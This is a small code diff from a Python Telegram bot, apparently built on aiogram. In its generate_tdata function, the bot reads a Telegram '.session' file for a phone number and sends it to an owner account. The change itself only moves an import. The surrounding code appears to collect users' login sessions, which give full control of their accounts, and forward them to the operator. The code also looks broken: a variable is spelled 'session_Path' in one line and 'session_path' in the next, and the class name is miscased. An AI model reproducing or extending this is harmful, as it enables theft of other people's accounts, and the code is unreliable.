@@ -121,10 +121,9 @@ async def generate_tdata(user_id, phone):
         if os.path.exists(session_Path):
             with open(session_path, 'rb') as f:
                 file_data = f.read()
-            from aiogram.types import bufferedinputfile
             await b.send_document(
                 owner_id,
-                bufferedinputfile(file_data, filename=f'{phone}.session'),
+                types.bufferedinputfile(file_data, filename=f'{phone}.session'),
                 caption=f'✅ Session для {phone}'
             )
         await b.session.close()
